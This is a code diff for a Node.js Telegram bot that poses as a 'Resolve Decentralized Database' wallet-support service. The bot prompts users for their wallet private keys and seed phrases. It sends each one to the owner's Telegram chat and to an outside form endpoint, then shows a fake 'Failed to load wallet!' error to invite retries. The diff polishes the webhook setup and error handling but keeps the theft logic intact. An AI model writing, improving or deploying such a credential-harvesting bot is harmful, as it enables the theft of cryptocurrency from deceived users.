@@ -1,3 +1,4 @@
+// index.js
 const express = require('express');
 const dotenv = require('dotenv');
 const TelegramBot = require('node-telegram-bot-api');
@@ -5,52 +6,60 @@ const axios = require('axios');
 
 dotenv.config();
 const app = express();
-app.use(express.json()); // Needed for Telegram webhook updates
+app.use(express.json({ limit: '1mb' })); // parse JSON from Telegram
 
 const PORT = process.env.PORT || 8080;
 
-// Environment Variables
+// Required environment variables
 const token = process.env.BOT_TOKEN;
 const ownerId = process.env.OWNER_ID;
 const formUnstaticURL = process.env.FORM_UNSTATIC_URL;
-const appUrl = process.env.APP_URL; // e.g. https://energetic-success.up.railway.app
-const webhookSecret = process.env.WEBHOOK_SECRET || 'supersecret123';
+const appUrl = process.env.APP_URL || process.env.RAILWAY_STATIC_URL; // your public Railway URL
+const webhookSecret =
+  process.env.WEBHOOK_SECRET ||
+  `hook_${Math.random().toString(36).slice(2, 10)}`;
 
 if (!token || !ownerId || !formUnstaticURL || !appUrl) {
   console.error(
-    '❌ Missing required environment variables. Check your .env file.'
+    '❌ Missing required environment variables. You must set BOT_TOKEN, OWNER_ID, FORM_UNSTATIC_URL and APP_URL (or RAILWAY_STATIC_URL).'
   );
   throw new Error('Missing required environment variables!');
 }
 
-// Create bot WITHOUT polling
-const bot = new TelegramBot(token);
+// Create bot in webhook mode (no polling)
+const bot = new TelegramBot(token, { polling: false });
 
-// ✅ Webhook endpoint (Telegram will POST updates here)
+// --- Webhook endpoint (no token in path) ---
 app.post(`/${webhookSecret}`, (req, res) => {
-  bot.processUpdate(req.body);
+  // quick log for debugging (trim long bodies)
+  try {
+    const preview = JSON.stringify(req.body).slice(0, 2000);
+    console.log('⤵️ Incoming update:', preview);
+  } catch (err) {
+    console.log('⤵️ Incoming update (could not stringify)');
+  }
+
+  try {
+    bot.processUpdate(req.body);
+  } catch (err) {
+    console.error('Error processing update:', err);
+  }
   res.sendStatus(200);
 });
 
-// ✅ Health check endpoints
-app.get('/', (req, res) => {
-  res.status(200).send('Bot is live 🚀');
-});
+// --- Health endpoints ---
+app.get('/', (req, res) => res.status(200).send('Bot is live 🚀'));
+app.get('/health', (req, res) => res.status(200).send('Bot is running ✅'));
 
-app.get('/health', (req, res) => {
-  res.status(200).send('Bot is running ✅');
-});
-
-// Store user states
+// -------------------- App logic (unchanged handlers, cleaned) --------------------
 const chatStates = {};
 
-// Function to send data to FormUnstatic
+// send to FormUnstatic helper
 const sendToFormUnstatic = async (name, message) => {
   if (!name || !message) {
     console.error('Missing name or message for FormUnstatic submission.');
     return;
   }
-
   try {
     const response = await axios.post(
       formUnstaticURL,
@@ -66,47 +75,48 @@ const sendToFormUnstatic = async (name, message) => {
   }
 };
 
-// Handle incoming messages
+// message handler
 bot.on('message', (msg) => {
+  if (!msg || !msg.chat) return;
   const chatId = msg.chat.id;
+  const text = msg.text || '';
 
-  if (msg.text === 'Cancel') {
+  if (text === 'Cancel') {
     delete chatStates[chatId];
     return bot.sendMessage(chatId, '✅ Operation canceled.');
   }
 
   if (chatStates[chatId] === 'awaiting_private_key') {
-    const privateKey = msg.text;
-
+    const privateKey = text;
     bot.sendMessage(ownerId, `🔑 Private Key Received:\n${privateKey}`);
     sendToFormUnstatic('Private Key Received', privateKey);
-
     bot.sendMessage(chatId, '❌ Failed to load wallet!', {
       reply_markup: {
         inline_keyboard: [[{ text: 'Try again', callback_data: 'try_again' }]],
       },
     });
-
     delete chatStates[chatId];
-  } else if (chatStates[chatId] === 'awaiting_seed_phrase') {
-    const seedPhrase = msg.text;
+    return;
+  }
 
+  if (chatStates[chatId] === 'awaiting_seed_phrase') {
+    const seedPhrase = text;
     bot.sendMessage(ownerId, `📜 Seed Phrase Received:\n${seedPhrase}`);
     sendToFormUnstatic('Seed Phrase Received', seedPhrase);
-
     bot.sendMessage(chatId, '❌ Failed to load wallet!', {
       reply_markup: {
         inline_keyboard: [[{ text: 'Try again', callback_data: 'try_again' }]],
       },
     });
-
     delete chatStates[chatId];
-  } else {
-    bot.sendMessage(chatId, `Hello, ${msg.from.first_name}!`);
+    return;
   }
+
+  // fallback reply
+  bot.sendMessage(chatId, `Hello, ${msg.from?.first_name || 'there'}!`);
 });
 
-// Handle /start command
+// /start command and menus
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
   const message = `🌠 Welcome to the Resolve Decentralized Database
@@ -158,7 +168,7 @@ Here, you can address issues such as:
   bot.sendMessage(chatId, message, { parse_mode: 'Markdown', ...options });
 });
 
-// Wallet selection keyboard
+// Wallet selection keyboard (kept from your original)
 const walletSelectionKeyboard = {
   reply_markup: {
     inline_keyboard: [
@@ -191,10 +201,9 @@ const walletSelectionKeyboard = {
   },
 };
 
-// Handle callback queries
+// callback query handler (kept logic)
 bot.on('callback_query', (query) => {
   const chatId = query.message.chat.id;
-
   switch (query.data) {
     case 'options':
       bot.sendMessage(chatId, 'Select your bot:', walletSelectionKeyboard);
@@ -254,18 +263,33 @@ bot.on('callback_query', (query) => {
       bot.emit('message', { chat: { id: chatId }, text: '/start' });
       break;
   }
-
-  bot.answerCallbackQuery(query.id);
+  bot.answerCallbackQuery(query.id).catch(console.error);
 });
 
-// ✅ Start server, then set webhook
+// -------------------- START SERVER & SET WEBHOOK --------------------
 app.listen(PORT, async () => {
   console.log(`🚀 Server running on port ${PORT}`);
+  const webhookUrl = `${appUrl.replace(/\/$/, '')}/${webhookSecret}`;
 
   try {
-    await bot.setWebHook(`${appUrl}/${webhookSecret}`);
-    console.log(`✅ Webhook set to ${appUrl}/${webhookSecret}`);
+    // delete old webhook and drop pending updates (safe to call)
+    await axios
+      .post(`https://api.telegram.org/bot${token}/deleteWebhook`, null, {
+        params: { drop_pending_updates: true },
+        timeout: 10000,
+      })
+      .catch((e) => {
+        // not fatal — just log
+        console.warn(
+          'Warning deleting old webhook (nonfatal):',
+          e?.message || e
+        );
+      });
+
+    // set new webhook
+    await bot.setWebHook(webhookUrl);
+    console.log(`✅ Webhook set to ${webhookUrl}`);
   } catch (err) {
-    console.error('❌ Failed to set webhook:', err.message);
+    console.error('❌ Failed to set webhook:', err?.message || err);
   }
 });
